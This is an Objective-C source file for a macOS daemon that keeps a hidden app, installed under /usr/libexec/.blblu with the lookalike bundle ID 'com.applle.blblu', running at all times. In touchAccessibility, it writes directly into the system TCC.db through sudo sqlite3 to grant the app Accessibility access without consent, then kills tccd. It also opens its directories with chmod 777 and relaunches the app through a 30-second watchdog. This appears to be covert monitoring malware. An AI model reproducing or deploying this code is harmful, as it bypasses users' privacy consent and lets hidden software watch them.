//
//  blbldAppDelegate.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "blbldAppDelegate.h"
#import "blbldUtils.h"
#import "NotificationManager.h"
#import "AppTerminateMonitor.h"

#import "DaemonPrivateHome.h"

#import <SystemConfiguration/SystemConfiguration.h>
#include <sys/sysctl.h>

@interface blbldAppDelegate (private)
- (void) setUpHomeDirectory;
- (void) touchAccessibility;
- (void) launch;
- (void) runIfNecessary;

- (void) registerDeviceLogoff;
- (void) unregisterDeviceLogoff;
- (void) deviceLogoff: (NSNotification *) aNotification;
@end

@implementation blbldAppDelegate

@synthesize window;
@synthesize mArgs, mNotificationManager, mAppTerminateMonitor;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    [self setMArgs:args];
    DLog(@"Launching args, %@", self.mArgs);
    
    // -- Prepare home directory
    [self setUpHomeDirectory];

    // -- Touch accessibility
    [self touchAccessibility];
    
    // -- Launch
    [self launch];
    
    // -- Monitor update or uninstallation
    mNotificationManager = [[NotificationManager alloc]init];
    [mNotificationManager startWatching];
    
    // -- Monitor blblu die
    mAppTerminateMonitor = [[AppTerminateMonitor alloc] init];
    [mAppTerminateMonitor setMDelegate:self];
    [mAppTerminateMonitor setMSelector:@selector(runIfNecessary)];
    [mAppTerminateMonitor setMProcessName:[self.mArgs objectAtIndex:2]];
    [mAppTerminateMonitor start];
    
    
    // -- Watch dog timer
    mKeepLiveTimer = [NSTimer scheduledTimerWithTimeInterval:30
                                                      target:self
                                                    selector:@selector(runIfNecessary)
                                                    userInfo:nil
                                                     repeats:YES];
    
    [self registerDeviceLogoff];
}

#pragma mark Private methods
#pragma mark -

- (void) setUpHomeDirectory {
    NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
    NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
    NSString *command = [NSString stringWithFormat:@"chmod -R 777 %@", sharedHome];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
    
    NSString* etcPath = [privateHome stringByAppendingString:@"etc/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:etcPath];
    command = [NSString stringWithFormat:@"chmod -R 777 %@", etcPath];
    system([command cStringUsingEncoding:NSUTF8StringEncoding]);
}

- (void) touchAccessibility {
    SInt32 OSXversionMajor = 0, OSXversionMinor = 0;
    if(Gestalt(gestaltSystemVersionMajor, &OSXversionMajor) == noErr && Gestalt(gestaltSystemVersionMinor, &OSXversionMinor) == noErr)
    {
        // 10.6 - 10.8
        if(OSXversionMajor == 10 && OSXversionMinor >= 6 && OSXversionMajor == 10 && OSXversionMinor < 9 ) {
            system("sudo touch /private/var/db/.AccessibilityAPIEnabled");
        }
        // >= 10.9
        else if(OSXversionMajor == 10 && OSXversionMinor >= 9) {
            system("sudo -u root sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','com.applle.blblu',0,1,1,NULL);\"");
        }
    }
    
    // Make touch take effect
    system("sudo killall -9 tccd");
}

- (void) launch {
    uid_t uid				= 0;
    gid_t gid				= 0;
    NSString *username =  (NSString *)SCDynamicStoreCopyConsoleUser(NULL, &uid, &gid);
    DLog(@"username = %@", username);
    
    /**********************************************************************************************************
     Arguments:
     0 /usr/libexec/.blblu/blblu/Contents/Resources/Launch.sh
     1 /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
     2 blblu
     3 blblu-load-all
     
     >> sudo -u TARGETUSERNAME open -a /usr/libexec/.blblu/blblu/Contents/MacOS/blblu --args blblu-load-all
     **********************************************************************************************************/
    
    NSString *charCmd = [NSString stringWithFormat:@"sudo -u %@ open -a %@ --args %@", username, [[self mArgs] objectAtIndex:1], [[self mArgs] objectAtIndex:3]];
    system([charCmd UTF8String]);
    [username release];
    DLog(@"charCmd = %@", charCmd);
}

- (void) runIfNecessary {
    DLog(@"Attempts to check and run if necessary");
    BOOL shouldStart = true;
    
    NSString *blbluProcessName = [[self mArgs] objectAtIndex:2];
    NSArray * temp = [blbldUtils getRunnigProcesses];
    for (int i=0; i<[temp count]; i++) {
        NSDictionary * tempdic = [temp objectAtIndex:i];
        NSString *processName = [NSString stringWithFormat:@"%@",[tempdic objectForKey:kRunningProcessNameTag]];
        if([processName isEqualToString:blbluProcessName]) {
            shouldStart = false;
        }
    }
    DLog(@"shouldStart = %d", shouldStart);

    if (shouldStart) {
        [self setUpHomeDirectory];
        
        [self touchAccessibility];

        [self launch];
        
        [mAppTerminateMonitor stop];
        [mAppTerminateMonitor start];
    }
}

- (void) registerDeviceLogoff {
    DLog(@"Register user logoff notification");
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    [nc addObserver:self selector:@selector(deviceLogoff:) name:NSWorkspaceWillPowerOffNotification object:nil];
}

- (void) unregisterDeviceLogoff {
    DLog(@"Unregister user logoff notification");
    NSNotificationCenter *nc = [[NSWorkspace sharedWorkspace] notificationCenter];
    [nc removeObserver:self name:NSWorkspaceWillPowerOffNotification object:nil];
}

- (void) deviceLogoff:(NSNotification *)aNotification {
    DLog(@"Daemon detects user logoff");
    
    if (mKeepLiveTimer) {
        [mKeepLiveTimer invalidate];
        mKeepLiveTimer = nil;
    }
    
    [mAppTerminateMonitor stop];
}

#pragma mark Memory management
#pragma mark -

- (void) dealloc {
    [self unregisterDeviceLogoff];
    [mAppTerminateMonitor stop];
    [mAppTerminateMonitor release];
    [mNotificationManager release];
    [mArgs release];
    [super dealloc];
}

@end
